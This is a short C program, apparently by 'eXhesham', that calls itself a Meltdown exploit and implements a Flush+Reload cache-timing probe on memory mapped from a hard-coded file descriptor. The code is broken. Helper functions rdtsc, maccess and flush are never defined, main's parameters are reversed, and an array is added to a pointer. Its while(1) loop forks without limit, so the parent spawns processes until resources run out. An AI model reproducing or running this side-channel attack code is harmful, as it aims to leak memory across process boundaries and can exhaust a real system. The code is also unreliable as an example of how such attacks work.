#include<stdio.h>
#include<sys/types.h>
#include<unistd.h>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (155)


unsigned int offset[1024];

size_t kpause = 0;
void flushandreload(void* addr)
{
  size_t time = rdtsc();
  maccess(addr);
  size_t delta = rdtsc() - time;
  flush(addr);
  if (delta < MIN_CACHE_MISS_CYCLES)
  {
    if (kpause > 0)
    {
      printf("%lu: Cache Hit Phase for  (%lu cycles) after a pause of %lu cycles\n", time, delta, kpause);
    }
    kpause = 0;
  }
  else
    kpause++;
}


int main(char** argv, int argc){
	printf("welcome to meltdown by eXhesham");
	while(1)
	{
		unsigned char* addr = (unsigned char*)mmap(0, 64*1024*1024, PROT_READ, MAP_SHARED, 5, 0);
		int child = fork();
		if(addr != (void*)-1 && addr != (void*)0){
			flushandreload(addr + offset);			
		}
		if(child == 0){
			break;
		}
		/*for (int i = 0; i < 3; ++i){
			sched_yield();
		}*/
			
	}
}